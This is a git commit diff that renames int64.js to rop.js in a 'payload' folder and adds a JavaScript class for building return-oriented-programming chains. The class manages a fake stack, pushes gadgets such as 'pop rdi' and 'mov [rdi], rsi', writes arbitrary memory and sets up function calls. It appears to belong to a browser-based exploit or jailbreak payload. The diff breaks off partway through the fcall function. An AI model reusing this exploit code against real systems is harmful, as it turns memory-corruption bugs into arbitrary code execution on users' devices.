b37c4bf0469b5bd674aff34b223518f2ca5d2ede
Lev <libya23hamady@gmail.com>
2026-02-15 20:36:45 +0200

    Update and rename int64.js to rop.js

--- payload/rop.js
+++ payload/rop.js
@@ -1,4 +1,56 @@
-        if (rdx != undefined) {
+const stack_sz = 0x40000;
+const reserve_upper_stack = 0x10000;
+const stack_reserved_idx = reserve_upper_stack / 4;
+
+
+// Class for quickly creating and managing a ROP chain
+window.rop = function () {
+    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
+    this.stack = this.stackback.add32(reserve_upper_stack);
+    this.stack_array = this.stackback.backing;
+    this.retval = this.stackback.add32(stack_sz);
+    this.count = 1;
+    this.branches_count = 0;
+    this.branches_rsps = p.malloc(0x200);
+
+    this.clear = function () {
+        this.count = 1;
+        this.branches_count = 0;
+
+        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
+            this.stack_array[i + stack_reserved_idx] = 0;
+        }
+    };
+
+    this.pushSymbolic = function () {
+        this.count++;
+        return this.count - 1;
+    }
+
+    this.finalizeSymbolic = function (idx, val) {
+        if (val instanceof int64) {
+            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
+            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
+        } else {
+            this.stack_array[stack_reserved_idx + idx * 2] = val;
+            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
+        }
+    }
+
+    this.push = function (val) {
+        this.finalizeSymbolic(this.pushSymbolic(), val);
+    }
+
+    this.push_write8 = function (where, what) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["pop rsi"]);
+        this.push(what);
+        this.push(gadgets["mov [rdi], rsi"]);
+    }
+
+    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+if (rdx != undefined) {
             this.push(gadgets["pop rdx"]);
             this.push(rdx);
         }
